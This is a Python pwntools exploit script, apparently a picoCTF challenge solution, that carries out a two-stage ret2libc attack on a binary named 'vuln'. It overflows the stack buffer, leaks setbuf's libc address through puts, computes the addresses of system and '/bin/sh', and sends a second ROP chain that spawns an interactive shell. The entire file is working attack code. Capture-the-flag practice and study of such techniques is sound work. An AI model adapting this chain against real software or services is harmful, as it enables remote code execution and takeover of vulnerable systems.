#!/usr/bin/env python3

from pwn import *

# Load the binary
elf = context.binary = ELF("./vuln")
libc = elf.libc  # Use the provided libc if you have it

# Gadgets and addresses
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Find a `ret` gadget to align the stack
ret_gadget = rop.find_gadget(['ret'])[0]

# Addresses
setbuf_got = elf.got['setbuf']
puts_plt = elf.plt['puts']
main_addr = elf.symbols['main']

# Offsets in libc (these would need to be determined beforehand)
# These values are placeholders and need to be replaced with actual offsets
# obtained from tools like `readelf` or `libc-database`
setbuf_offset = libc.symbols['setbuf']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))

# Create the payload to leak the address of setbuf
buffer = b"A" * 136
buffer += p64(pop_rdi)
buffer += p64(setbuf_got)
buffer += p64(puts_plt)
buffer += p64(main_addr)

# Connect to the remote service
# p = remote("mercury.picoctf.net", 1774)

p = elf.process()

# Send the first payload
p.recvline()
p.sendline(buffer)

# Receive the leaked address
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Leaked setbuf address: {hex(leak)}")

# Calculate libc base
libc_base = leak - setbuf_offset
log.info(f"LIBC base address: {hex(libc_base)}")

# Calculate system and /bin/sh addresses
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
log.info(f"System address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Create the final payload to get a shell
exp = b"A" * 136
exp += p64(pop_rdi)
exp += p64(bin_sh_addr)
exp += p64(ret_gadget)  # To align stack
exp += p64(system_addr)

# Send the final payload
p.recvline()
p.sendline(exp)
p.interactive()
